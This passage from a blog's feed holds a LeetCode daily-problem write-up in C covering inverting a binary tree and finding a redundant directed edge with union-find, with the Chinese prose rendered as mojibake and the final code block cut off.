    <summary type="html">&lt;h1 id=&quot;0x00-ç»ªè®º&quot;&gt;&lt;a href=&quot;#0x00-ç»ªè®º&quot; class=&quot;headerlink&quot; title=&quot;0x00.ç»ªè®º&quot;&gt;&lt;/a&gt;0x00.ç»ªè®º&lt;/h1&gt;&lt;p&gt;æœ¬æ¥ä¸æƒ³è¿™ä¹ˆå¿«åˆå¼€ä¸€ç¯‡æ–°çš„blogçš„ï¼ˆ&lt;del&gt;æ¯•ç«Ÿä¸€ç¯‡OJå°±æ˜¯ä¸€ä¸ªå‘ï¼Œå‰é¢çš„å¥½å¤šå‘æ‰åˆšåˆšå¼€æŒ–&lt;/del&gt;ï¼‰ï¼Œä¸è¿‡å› ä¸ºåˆšå¥½åšäº†æ¯æ—¥ä¸€é¢˜çš„å‰ç½®é¢˜ç›®è€Œåˆšå¥½è¿™é“é¢˜åˆæ˜¯æ ‘&amp;#x2F;å›¾é¢˜æ‰€ä»¥æƒ³æ‰¾ä¸ªåœ°æ–¹è®°å½•ä¸‹æ¥å› æ­¤å°±å¼€äº†ä¸€ç¯‡æ–°åšå®¢&lt;/p&gt;
&lt;p&gt;é¢˜å¥½éš¾åšå•Š.jpg&lt;/p&gt;</summary>
    
    
    
    <category term="Online Judge" scheme="http://archive.next.arttnba3.cn/categories/Online-Judge/"/>
    
    
    <category term="ç®—æ³•" scheme="http://archive.next.arttnba3.cn/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="C/C++" scheme="http://archive.next.arttnba3.cn/tags/C-C/"/>
    
    <category term="é¢˜è§£" scheme="http://archive.next.arttnba3.cn/tags/%E9%A2%98%E8%A7%A3/"/>
    
    <category term="é“¾è¡¨" scheme="http://archive.next.arttnba3.cn/tags/%E9%93%BE%E8%A1%A8/"/>
    
    <category term="Leetcode" scheme="http://archive.next.arttnba3.cn/tags/Leetcode/"/>
    
    <category term="åŠ¨æ€è§„åˆ’" scheme="http://archive.next.arttnba3.cn/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
    
    <category term="æ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰" scheme="http://archive.next.arttnba3.cn/tags/%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2%EF%BC%88DFS%EF%BC%89/"/>
    
    <category term="æ ‘" scheme="http://archive.next.arttnba3.cn/tags/%E6%A0%91/"/>
    
    <category term="äºŒå‰æ ‘" scheme="http://archive.next.arttnba3.cn/tags/%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
    
    <category term="å›¾è®º" scheme="http://archive.next.arttnba3.cn/tags/%E5%9B%BE%E8%AE%BA/"/>
    
    <category term="å¹¿åº¦ä¼˜å…ˆæœç´¢ï¼ˆBFSï¼‰" scheme="http://archive.next.arttnba3.cn/tags/%E5%B9%BF%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2%EF%BC%88BFS%EF%BC%89/"/>
    
    <category term="æ— å‘å›¾" scheme="http://archive.next.arttnba3.cn/tags/%E6%97%A0%E5%90%91%E5%9B%BE/"/>
    
    <category term="å¹¶æŸ¥é›†" scheme="http://archive.next.arttnba3.cn/tags/%E5%B9%B6%E6%9F%A5%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>ã€OJ-0x0004-Leetcodeã€‘æ¯æ—¥ä¸€é¢˜éƒ¨åˆ†write up by arttnba3</title>
    <link href="http://archive.next.arttnba3.cn/2020/09/16/%E3%80%90OJ-0x0004-Leetcode%E3%80%91%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%E9%83%A8%E5%88%86write-up-by-arttnba3/"/>
    <id>http://archive.next.arttnba3.cn/2020/09/16/%E3%80%90OJ-0x0004-Leetcode%E3%80%91%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%E9%83%A8%E5%88%86write-up-by-arttnba3/</id>
    <published>2020-09-16T10:52:28.000Z</published>
    <updated>2021-02-27T15:17:57.131Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-ç»ªè®º"><a href="#0x00-ç»ªè®º" class="headerlink" title="0x00.ç»ªè®º"></a>0x00.ç»ªè®º</h1><p>ä¸ºäº†ä¿æŒç¼–ç¨‹çš„ä¸€ä¸ªæ‰‹æ„Ÿï¼ˆæ¯•ç«Ÿç–«æƒ…ä»¥æ¥æ‰“çš„ä»£ç æ¯”ä»¥å‰å°‘å¾—å¤šäº†ï¼‰ï¼ŒåŒæ—¶ä¹Ÿä¸ºäº†æé«˜è‡ªå·±çš„å§¿åŠ¿æ°´å¹³ï¼ˆxï¼‰ï¼Œæ‰“ç®—ä»ä»Šå¤©å¼€å§‹åˆ·Leetcodeæä¾›çš„æ¯æ—¥ä¸€é¢˜å¹¶åœ¨æ­¤åšä¸€ä¸ªå°å°çš„è®°å½•ï¼ˆxï¼‰</p><p>å¸Œæœ›å‡ å¹´ä»¥åè¿™é‡Œå·²ç»ç§¯ç´¯äº†ä¸Šåƒé“é¢˜â‘§ï¼ˆ<del>æ²¡å¯èƒ½çš„</del></p><img src="https://i.loli.net/2020/10/15/rqasE7pNAxQXy9l.png" alt="image.png" style="zoom:50%;" /><span id="more"></span><h1 id="0x01-2020"><a href="#0x01-2020" class="headerlink" title="0x01. 2020"></a>0x01. 2020</h1><h2 id="September"><a href="#September" class="headerlink" title="September"></a>September</h2><h3 id="16-226-ç¿»è½¬äºŒå‰æ ‘ï¼ˆç®€å•ï¼‰"><a href="#16-226-ç¿»è½¬äºŒå‰æ ‘ï¼ˆç®€å•ï¼‰" class="headerlink" title="16 - 226. ç¿»è½¬äºŒå‰æ ‘ï¼ˆç®€å•ï¼‰"></a>16 - <a href="https://leetcode-cn.com/problems/invert-binary-tree/">226. ç¿»è½¬äºŒå‰æ ‘ï¼ˆç®€å•ï¼‰</a></h3><blockquote><p>ç¿»è½¬ä¸€æ£µäºŒå‰æ ‘ã€‚</p><p><strong>ç¤ºä¾‹ï¼š</strong></p><p>è¾“å…¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">     4</span><br><span class="line">   /   \</span><br><span class="line">  2     7</span><br><span class="line"> / \   / \</span><br><span class="line">1   3 6   9</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">     4</span><br><span class="line">   /   \</span><br><span class="line">  7     2</span><br><span class="line"> / \   / \</span><br><span class="line">9   6 3   1</span><br></pre></td></tr></table></figure><p><strong>å¤‡æ³¨:</strong><br>è¿™ä¸ªé—®é¢˜æ˜¯å—åˆ° <a href="https://twitter.com/mxcl">Max Howell </a>çš„ <a href="https://twitter.com/mxcl/status/608682016205344768">åŸé—®é¢˜</a> å¯å‘çš„ ï¼š</p><blockquote><p>è°·æ­Œï¼šæˆ‘ä»¬90ï¼…çš„å·¥ç¨‹å¸ˆä½¿ç”¨æ‚¨ç¼–å†™çš„è½¯ä»¶(Homebrew)ï¼Œä½†æ˜¯æ‚¨å´æ— æ³•åœ¨é¢è¯•æ—¶åœ¨ç™½æ¿ä¸Šå†™å‡ºç¿»è½¬äºŒå‰æ ‘è¿™é“é¢˜ï¼Œè¿™å¤ªç³Ÿç³•äº†ã€‚</p></blockquote></blockquote><p>å¾ˆå¸¸è§„çš„ä¹Ÿå¾ˆç®€å•çš„ä¸€é“é¢˜ç›®ï¼Œåªéœ€<strong>é€å±‚äº¤æ¢å·¦å³èŠ‚ç‚¹</strong>å³å¯ï¼ˆ<del>homebrewçš„å¼€å‘è€…å±…ç„¶å†™ä¸å‡ºè¿™ä¸ªé¢˜ä¹ˆ</del>ï¼ˆ<del>ä¼°è®¡æ˜¯å¤ªç´§å¼ le</del>ï¼ˆ<del>ğŸ‘ˆä¸è¦åœ¨æ„è¿™å®¶ä¼™å¤©å¤©ä¹±è®²</del></p><h4 id="è§£æ³•ä¸€ï¼šé€’å½’"><a href="#è§£æ³•ä¸€ï¼šé€’å½’" class="headerlink" title="è§£æ³•ä¸€ï¼šé€’å½’"></a>è§£æ³•ä¸€ï¼šé€’å½’</h4><p>ä¸€å±‚ä¸€å±‚äº¤æ¢ç»“ç‚¹çš„åšæ³•ï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“å°±æƒ³åˆ°é€’å½’ï¼Œæ•…æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">TreeNode</span>* <span class="built_in">invertTree</span>(<span class="keyword">struct</span> TreeNode* root)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">TreeNode</span> * temp;</span><br><span class="line">    temp = root-&gt;left;</span><br><span class="line">    root-&gt;left = root-&gt;right;</span><br><span class="line">    root-&gt;right = temp;</span><br><span class="line">    <span class="built_in">invertTree</span>(root-&gt;left);</span><br><span class="line">    <span class="built_in">invertTree</span>(root-&gt;right);</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“ç„¶ï¼Œé€’å½’è°ƒç”¨ä¼šå ç”¨å¤§é‡çš„æ ˆç©ºé—´ï¼ˆæ¯æ¬¡è¿›è¡Œå‡½æ•°è°ƒç”¨éƒ½ä¼šç”Ÿæˆä¸€ä¸ªæ–°çš„æ ˆå¸§ï¼‰ï¼Œæ‰€ä»¥ç©ºé—´å¤æ‚åº¦ä¸Šä¸æ˜¯å¾ˆå¥½çœ‹ï¼ˆ</p><p><img src="https://i.loli.net/2020/09/16/PaIkMX54n7zH1bJ.png" alt="image.png"></p><h4 id="è§£æ³•äºŒï¼šå¹¿åº¦ä¼˜å…ˆæœç´¢ï¼ˆé˜Ÿåˆ—ï¼‰"><a href="#è§£æ³•äºŒï¼šå¹¿åº¦ä¼˜å…ˆæœç´¢ï¼ˆé˜Ÿåˆ—ï¼‰" class="headerlink" title="è§£æ³•äºŒï¼šå¹¿åº¦ä¼˜å…ˆæœç´¢ï¼ˆé˜Ÿåˆ—ï¼‰"></a>è§£æ³•äºŒï¼šå¹¿åº¦ä¼˜å…ˆæœç´¢ï¼ˆé˜Ÿåˆ—ï¼‰</h4><p>å¤§æ¦‚è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ul><li>å¤´ç»“ç‚¹å…¥é˜Ÿ</li><li>äº¤æ¢å·¦å³ç»“ç‚¹</li><li>å·¦å³ç»“ç‚¹å…¥é˜Ÿ</li><li>å¤´ç»“ç‚¹å‡ºé˜Ÿ</li></ul><p>é˜Ÿåˆ—ä¸ºç©ºæ—¶åœæ­¢å³å¯</p><p>å› ä¸ºæ•°æ®èŒƒå›´ä¸åƒOIé‚£ä¹ˆå˜æ€ï¼ˆxï¼‰ï¼Œæ‰€ä»¥ç›´æ¥ç”¨ä¸€ä¸ªå¾ˆå°çš„æ•°ç»„æ¥å‚¨å­˜å³å¯</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">TreeNode</span>* <span class="built_in">invertTree</span>(<span class="keyword">struct</span> TreeNode* root)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    <span class="type">int</span> start=<span class="number">0</span>, end=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">TreeNode</span> * (queue[<span class="number">1000</span>]), *temp;</span><br><span class="line">    queue[start] = root;</span><br><span class="line">    <span class="keyword">while</span>(start!=end)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(queue[start] != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            temp = queue[start]-&gt;left;</span><br><span class="line">            queue[start]-&gt;left = queue[start]-&gt;right;</span><br><span class="line">            queue[start]-&gt;right = temp;</span><br><span class="line">            queue[end] = queue[start]-&gt;left;</span><br><span class="line">            queue[end+<span class="number">1</span>] = queue[start]-&gt;right;</span><br><span class="line">            end += <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        start++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/16/Y68GBXM2hlSKgzs.png" alt="image.png"></p><blockquote><p>ä»¥åŠè¿™ä¸ªæ•…äº‹å®åœ¨æ˜¯å¤ªæäº†</p><p><img src="https://i.loli.net/2020/09/16/NW26F4OInxfqbmy.png" alt="image.png"></p></blockquote><h3 id="17-685-å†—ä½™è¿æ¥-IIï¼ˆå›°éš¾ï¼‰"><a href="#17-685-å†—ä½™è¿æ¥-IIï¼ˆå›°éš¾ï¼‰" class="headerlink" title="17 - 685. å†—ä½™è¿æ¥ IIï¼ˆå›°éš¾ï¼‰"></a>17 - <a href="https://leetcode-cn.com/problems/redundant-connection-ii/">685. å†—ä½™è¿æ¥ IIï¼ˆå›°éš¾ï¼‰</a></h3><blockquote><p>åœ¨æœ¬é—®é¢˜ä¸­ï¼Œæœ‰æ ¹æ ‘æŒ‡æ»¡è¶³ä»¥ä¸‹æ¡ä»¶çš„æœ‰å‘å›¾ã€‚è¯¥æ ‘åªæœ‰ä¸€ä¸ªæ ¹èŠ‚ç‚¹ï¼Œæ‰€æœ‰å…¶ä»–èŠ‚ç‚¹éƒ½æ˜¯è¯¥æ ¹èŠ‚ç‚¹çš„åç»§ã€‚æ¯ä¸€ä¸ªèŠ‚ç‚¹åªæœ‰ä¸€ä¸ªçˆ¶èŠ‚ç‚¹ï¼Œé™¤äº†æ ¹èŠ‚ç‚¹æ²¡æœ‰çˆ¶èŠ‚ç‚¹ã€‚</p><p>è¾“å…¥ä¸€ä¸ªæœ‰å‘å›¾ï¼Œè¯¥å›¾ç”±ä¸€ä¸ªæœ‰ç€Nä¸ªèŠ‚ç‚¹ (èŠ‚ç‚¹å€¼ä¸é‡å¤1, 2, â€¦, N) çš„æ ‘åŠä¸€æ¡é™„åŠ çš„è¾¹æ„æˆã€‚é™„åŠ çš„è¾¹çš„ä¸¤ä¸ªé¡¶ç‚¹åŒ…å«åœ¨1åˆ°Nä¸­é—´ï¼Œè¿™æ¡é™„åŠ çš„è¾¹ä¸å±äºæ ‘ä¸­å·²å­˜åœ¨çš„è¾¹ã€‚</p><p>ç»“æœå›¾æ˜¯ä¸€ä¸ªä»¥è¾¹ç»„æˆçš„äºŒç»´æ•°ç»„ã€‚ æ¯ä¸€ä¸ªè¾¹ çš„å…ƒç´ æ˜¯ä¸€å¯¹ [u, v]ï¼Œç”¨ä»¥è¡¨ç¤ºæœ‰å‘å›¾ä¸­è¿æ¥é¡¶ç‚¹ u å’Œé¡¶ç‚¹ v çš„è¾¹ï¼Œå…¶ä¸­ u æ˜¯ v çš„ä¸€ä¸ªçˆ¶èŠ‚ç‚¹ã€‚</p><p>è¿”å›ä¸€æ¡èƒ½åˆ é™¤çš„è¾¹ï¼Œä½¿å¾—å‰©ä¸‹çš„å›¾æ˜¯æœ‰Nä¸ªèŠ‚ç‚¹çš„æœ‰æ ¹æ ‘ã€‚è‹¥æœ‰å¤šä¸ªç­”æ¡ˆï¼Œè¿”å›æœ€åå‡ºç°åœ¨ç»™å®šäºŒç»´æ•°ç»„çš„ç­”æ¡ˆã€‚</p><p>ç¤ºä¾‹ 1:</p><p>è¾“å…¥: [[1,2], [1,3], [2,3]]<br>è¾“å‡º: [2,3]<br>è§£é‡Š: ç»™å®šçš„æœ‰å‘å›¾å¦‚ä¸‹:<br>  1<br> &#x2F; <br>v   v<br>2â€“&gt;3<br>ç¤ºä¾‹ 2:</p><p>è¾“å…¥: [[1,2], [2,3], [3,4], [4,1], [1,5]]<br>è¾“å‡º: [4,1]<br>è§£é‡Š: ç»™å®šçš„æœ‰å‘å›¾å¦‚ä¸‹:<br>5 &lt;- 1 -&gt; 2<br>     ^    |<br>     |    v<br>     4 &lt;- 3<br>æ³¨æ„:</p><p>äºŒç»´æ•°ç»„å¤§å°çš„åœ¨3åˆ°1000èŒƒå›´å†…ã€‚<br>äºŒç»´æ•°ç»„ä¸­çš„æ¯ä¸ªæ•´æ•°åœ¨1åˆ°Nä¹‹é—´ï¼Œå…¶ä¸­ N æ˜¯äºŒç»´æ•°ç»„çš„å¤§å°ã€‚</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/redundant-connection-ii">https://leetcode-cn.com/problems/redundant-connection-ii</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><p><del>ç¬¬äºŒå¤©å°±ç›´æ¥ä¸Šå›°éš¾éš¾åº¦çš„é¢˜ï¼ŒçœŸæœ‰ä½ çš„å•Šleetcode</del></p><p><del>æš‚æ—¶åšä¸å‡ºæ¥ï¼Œæ­‡èœäº†Or2</del></p><h4 id="è§£æ³•ï¼šå¹¶æŸ¥é›†"><a href="#è§£æ³•ï¼šå¹¶æŸ¥é›†" class="headerlink" title="è§£æ³•ï¼šå¹¶æŸ¥é›†"></a>è§£æ³•ï¼šå¹¶æŸ¥é›†</h4><p>åŠå¤œä¸‰ç‚¹å¤šæŠŠå‰ç½®é¢˜ï¼š<a href="https://leetcode-cn.com/problems/redundant-connection/">684. å†—ä½™è¿æ¥</a>ç»™åšäº†ï¼ˆè§<a href="https://arttnba3.cn/2020/09/17/[OJ-0x0005-Leetcode]%E6%A0%91%E9%83%A8%E5%88%86write-up-by-arttnba3/">è¿™é‡Œ</a>ï¼‰ï¼Œæ„Ÿè§‰ç¨å¾®æœ‰äº†ç‚¹å¤´ç»ªï¼Œ<del>å…¶å®è¿˜æ˜¯å•¥éƒ½ä¸çŸ¥é“</del>â€¦</p><p>æ™šä¸Šå¤§æ¦‚æƒ³æ¸…æ¥šäº†ï¼ŒåŒæ ·æ˜¯é‡‡ç”¨å¹¶æŸ¥é›†çš„æ€æƒ³ï¼Œä¸è¿‡è€ƒè™‘åˆ°è¯¥å›¾ä¸ºæœ‰å‘å›¾ï¼ŒåŒæ—¶é¢˜ç›®ç»™å®šçš„å›¾<strong>å¿…å®šå­˜åœ¨ä¸€æ¡è¾¹ä½¿å¾—è¯¥å›¾æ— æ³•æˆä¸ºä¸€é¢—æ ‘</strong></p><p>å¯èƒ½å­˜åœ¨å¦‚ä¸‹æƒ…å†µï¼š</p><ul><li><strong>ä¸€ä¸ªèŠ‚ç‚¹çš„å…¥åº¦å¤§äºç­‰äº2</strong>ï¼ˆ<strong>å­˜åœ¨ä¸¤ä¸ªåŠä»¥ä¸Šçˆ¶ç»“ç‚¹ï¼Œæœ¬é¢˜æ•°æ®æ„é€ ä¿è¯åªå¯èƒ½å­˜åœ¨ä¸¤ä¸ªçˆ¶ç»“ç‚¹çš„æƒ…å†µ</strong>ï¼‰</li><li><strong>å›¾ä¸­å­˜åœ¨å›è·¯</strong></li><li><strong>ä»¥ä¸Šä¸¤ç§æƒ…å†µåŒæ—¶å­˜åœ¨</strong></li></ul><p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼ˆå­—ä¸‘è§è°…QwQï¼‰ï¼š</p><p><img src="https://i.loli.net/2020/09/18/HTi1XVUF7SuIRM3.png" alt="33A2C56517F4926A49A4C03363AECFD0.png"></p><p>æ•…æˆ‘ä»¬å¾ˆå®¹æ˜“ï¼ˆå¹¶ä¸Or2ï¼‰èƒ½å¤Ÿå¾—åˆ°è§£å¼€è¿™é“é¢˜çš„ç®—æ³•ï¼š</p><ul><li><strong>å°†æ¯ä¸€ä¸ªç»“ç‚¹åˆå§‹åŒ–ä¸ºä¸€æ£µå•ç‹¬çš„æ ‘ï¼Œå…¶çˆ¶ç»“ç‚¹åˆå§‹åŒ–ä¸ºè‡ªèº«</strong></li><li><strong>ä½¿ç”¨ä¸¤ä¸ªæ•°ç»„åˆ†åˆ«ä¿å­˜æ¯ä¸ªç»“ç‚¹çš„çˆ¶ç»“ç‚¹ä¸æ‰€å±çš„æ ‘çš„æ ¹ç»“ç‚¹</strong></li><li><strong>éå†æ¯ä¸€æ¡è¾¹ï¼Œé‡æ–°è®°å½•ä¸‹æ¯ä¸ªç»“ç‚¹çš„çˆ¶ç»“ç‚¹ä¸æ ¹èŠ‚ç‚¹</strong></li><li><strong>å½“ä¸€ä¸ªç»“ç‚¹çš„å…¥åº¦å¤§äº1æ—¶ï¼Œè®°å½•è¯¥è¾¹ä¸ºäº‰è®®è¾¹</strong></li><li><strong>å½“ä¸€æ¡è¾¹çš„å§‹æœ«ç»“ç‚¹åŒå±äºä¸€æ£µæ ‘æ—¶ï¼Œè®°å½•è¯¥æ¡è¾¹ä¸ºå›è·¯è¾¹</strong></li><li><strong>ä¸¤ç§æƒ…å†µéƒ½ä¸å­˜åœ¨ï¼Œåˆ™å°†è¯¥è¾¹çš„æœ«ç»“ç‚¹çš„çˆ¶ç»“ç‚¹æ ‡ä¸ºè¯¥è¾¹çš„å§‹ç»“ç‚¹ï¼Œå¹¶åˆå¹¶ä¸¤ç»“ç‚¹æ‰€åœ¨çš„æ ‘</strong></li><li><strong>å½“äº‰è®®è¾¹ä¸å­˜åœ¨æ—¶ï¼Œç›´æ¥åˆ é™¤å›è·¯è¾¹</strong></li><li><strong>äº‰è®®è¾¹è‹¥å­˜åœ¨ï¼Œè‹¥åŒæ—¶å­˜åœ¨å›è·¯è¾¹ï¼Œåˆ™åˆ é™¤äº‰è®®è¾¹æœ«å°¾ç»“ç‚¹åŠå…¶çˆ¶ç»“ç‚¹æ‰€æ„æˆè¾¹ï¼Œå¦åˆ™åˆ é™¤äº‰è®®è¾¹</strong></li></ul><p>æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> * ancestors;<span class="comment">//è®°å½•æ¯ä¸ªèŠ‚ç‚¹çš„æ ¹ç»“ç‚¹</span></span><br><span class="line"><span class="type">int</span> * parent;<span class="comment">//è®°å½•æ¯ä¸ªèŠ‚ç‚¹çš„çˆ¶ç»“ç‚¹</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">find_x</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> x == ancestors[x] ? x : (ancestors[x] = find_x(ancestors[x]));<span class="comment">//è·¯å¾„å‹ç¼©</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">union_ancestor</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line">    ancestors[find_x(a)] = find_x(b);<span class="comment">//å°†ä¸¤æ£µæ ‘åˆå¹¶ä¸ºä¸€æ£µæ ‘</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span>* <span class="title function_">findRedundantDirectedConnection</span><span class="params">(<span class="type">int</span>** edges, <span class="type">int</span> edgesSize, <span class="type">int</span>* edgesColSize, <span class="type">int</span>* returnSize)</span></span><br><span class="line">&#123;    </span><br><span class="line">    ancestors = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*(edgesSize+<span class="number">5</span>));</span><br><span class="line">    parent = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*(edgesSize+<span class="number">5</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=edgesSize;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        parent[i] = ancestors[i] = i;<span class="comment">//åˆå§‹åŒ–æ¯ä¸ªç»“ç‚¹ä¸ºå•ç‹¬çš„ä¸€æ£µæ ‘ï¼ˆå¹¶æŸ¥é›†ï¼‰ï¼Œç»“ç‚¹çš„çˆ¶ç»“ç‚¹æ ‡è®°ä¸ºè‡ªèº«</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//conflictï¼šå¯èƒ½å­˜åœ¨äº‰è®®çš„è¾¹</span></span><br><span class="line">    <span class="comment">//circleï¼šå¯èƒ½å½¢æˆå›è·¯çš„è¾¹</span></span><br><span class="line">    <span class="type">int</span> start, end, a_start, a_end, conflict = <span class="number">-1</span>, circle = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;edgesSize;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        start = edges[i][<span class="number">0</span>];</span><br><span class="line">        end = edges[i][<span 